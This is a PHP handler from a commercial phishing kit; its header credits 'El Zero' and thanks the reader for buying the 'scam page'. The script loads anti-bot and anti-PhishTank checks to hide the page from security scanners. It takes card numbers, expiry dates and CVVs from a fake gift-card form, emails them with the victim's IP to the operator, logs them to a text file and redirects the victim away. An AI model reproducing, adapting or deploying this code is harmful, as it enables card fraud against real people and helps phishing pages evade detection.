<?php
/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
icq =>  ElZero
telegram => @ElZero_Coder
Site => elzeroSite.com <SOON> 
Thanks For Buying My Scam Page
Copyright all Reserved to El Zero
*/
session_start();
// error_reporting(0);

require("../ElZero.php");
require '../function.php';

require ("../../antibots/antibot_ip.php");
require ("../../antibots/antibot_userAgent.php");
require ("../../antibots/antibot_host.php");
require ("../../antibots/antibot_phishtank.php");
require ("../../antibots/antibot_proxy.php");
require ("../../antibots/someBots.php");
require ("../../antibots/ipQualityScore.php");
// require ("../../antibots/antibot_blacklist.php");
if (!empty($_POST['elzeroKiller']) && isset($_POST['elzeroKiller'])) {
	header("Location: ".randomURl());exit();
}
// var_dump($_SESSION);

if ($_POST['tokenElzeroCsrf'] == $_SESSION['ElZeR0_ToKeN']) {
	if (isset($_POST['cardNumber']) && isset($_POST['expMonth']) && isset($_POST['expirationYear'])&& isset($_POST['cvv']) ) {
		if (!empty($_POST['cardNumber']) && !empty($_POST['expMonth']) && !empty($_POST['expirationYear'])&& !empty($_POST['cvv'])) {
			
				$expireDate = $_POST['expMonth'] .'/'. $_POST['expirationYear'];
				if (getfirst($_POST['cardNumber']) == false){
					header("Location: ../../secure?invalidCard");
				}

				$Browser = getBrowser();
				/*Message*/
				$MSG = $_POST['cardNumber'].":".$expireDate.":".$_POST['cvv']. " #ElZero Scam \r\n";
				/*End Message*/
				$sendToEmail = strtolower($sendToEmail);
				if ($sendToEmail == "true") {
					$subject = "vanilla Gift \xF0\x9F\x94\xA5[ElZero]\xF0\x9F\x94\xA5 expire => ".$expireDate." from ".$_SESSION['ip'];
					send($yourEmail,$subject,$MSG);
				}
				/*	Send Notification  	*/
				$sendNotify = strtolower($sendNotify);
				if ($sendNotify == "true") {
					$subject = " New Card vanilla Gift \xF0\x9F\x94\xA5[ElZero]\xF0\x9F\x94\xA5 from ".$_SESSION['ip'];
					send($emailNotify,$subject,$message);
				}



				$saveInText = strtolower($saveInText);
				if ($saveInText == "true") {
					$file = fopen("../../".$textName.".txt","a+");
					fwrite($file, $MSG);
					fclose($file);
				}
					
				
				header("Location: https://bit.ly/2OWmwsY");exit();
				
			
		}else{
			// echo "Empty";
			header("Location: ../../secure/3dsecure?id=chase&country=us&invalid");exit();
		}
	}else{
		// echo "Isset";
		header("Location: ../../secure/3dsecure?id=chase&country=us&invalid");exit();
	}
}else{
		echo 'Token';
		
	if (isset($_SESSION['emailGrabber']) ) {
		// header("Location: ../../?email=".$_SESSION['emailGrabber']);exit();
	}else{
		// header("Location: ../../");exit();
	}
	
}




